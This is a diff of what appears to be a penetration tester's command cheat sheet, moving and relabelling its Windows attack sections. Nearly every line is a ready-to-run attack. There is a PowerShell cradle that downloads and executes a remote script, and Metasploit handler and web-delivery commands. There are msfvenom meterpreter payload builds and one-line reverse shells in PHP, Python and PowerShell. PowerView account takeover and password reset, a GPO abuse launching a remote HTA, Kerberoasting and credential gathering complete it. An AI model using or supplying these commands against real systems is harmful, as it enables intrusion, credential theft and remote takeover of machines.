@@ -1441,7 +1441,7 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 
 ## Windows
 [*] Initial Shell
-+---------- Execute resh ----------+
++---------- Execute ----------+
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5555"
 
 [*] File Transfer
@@ -1587,11 +1587,11 @@ services.msc
 
 [*] Meterpreter
 +---------- Initial Shell ----------+
-64-Bit
-msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; set LPORT 8787; setg LHOST $MYIP; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
+-->> Standard
+rlwrap msfconsole -q -x "use multi/handler; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; setg LHOST $MYIP; setg LPORT 4444; run"
 
-32-Bit
-msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; set LPORT 8787; setg LHOST $MYIP; set TARGET PSH; setg PAYLOAD windows/meterpreter/reverse_tcp; run'
+-->> Web Delivery
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg LHOST $MYIP; setg LPORT 8787; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
 +---------- Stored Credentials ----------+
 run post/windows/gather/credentials/windows_autologin
@@ -1660,24 +1660,7 @@ sessions -i 1
 jobs
 jobs -k 1
 
-[*] Powerview
-Import-Module ./PowerView.ps1
-
-Get-NetDomain
-Get-LocalUser
-
-Get-ADuser gpoadm | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}
-Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
-Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights All
-Set-DomainUserPassword -Identity gpoadm -AccountPassword (ConvertTo-SecureString "123qweasdF!" -AsPlainText -Force)
-
-python3 pygpoabuse.py -dc-ip $TARGET $DOM/'gpoadm':'123qweasdF!' -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' -command 'mshta http://10.8.5.79:8080/buqT7ygPVm.hta'
-gpoupdate /force
-
-Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
-
-[*] Shells
-+---------- MSFVenom ----------+
+[*] MSFVenom
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o 0.exe
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o 0.msi
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
@@ -1685,11 +1668,23 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -
 msfvenom -p php/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.php
 msfvenom -p python/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.py
 
-+---------- One Line Reverse Shells ----------+
+[*] Reverse Shells
 php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
 powershell -nop -c "$AtpsZlvw99=New-Object System.Net.Sockets.TCPClient('$MYIP',5555);$DqvVumCJ99=$AtpsZlvw99.GetStream();[byte[]]$bytes=0..65535|ForEach-Object{0};while(($i=$DqvVumCJ99.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$fjVAQFpJ99=(Invoke-Expression $data 2>&1|Out-String);$vpVmHTLx99=$fjVAQFpJ99+'PS '+(Get-Location).Path+'> ';$BaZSdidm99=[System.Text.Encoding]::ASCII.GetBytes($vpVmHTLx99);$DqvVumCJ99.Write($BaZSdidm99,0,$BaZSdidm99.Length);$DqvVumCJ99.Flush()};$AtpsZlvw99.Close()"
 powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
+
+[*] Powerview
+Import-Module ./PowerView.ps1
+Get-NetDomain
+Get-LocalUser
+Get-ADuser gpoadm | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}
+Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
+Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights All
+Set-DomainUserPassword -Identity gpoadm -AccountPassword (ConvertTo-SecureString "123qweasdF!" -AsPlainText -Force)
+python3 pygpoabuse.py -dc-ip $TARGET $DOM/'gpoadm':'123qweasdF!' -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' -command 'mshta http://10.8.5.79:8080/buqT7ygPVm.hta'
+gpoupdate /force
+Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
 
 [*] Rubeus
 Rubeus.exe kerberoast
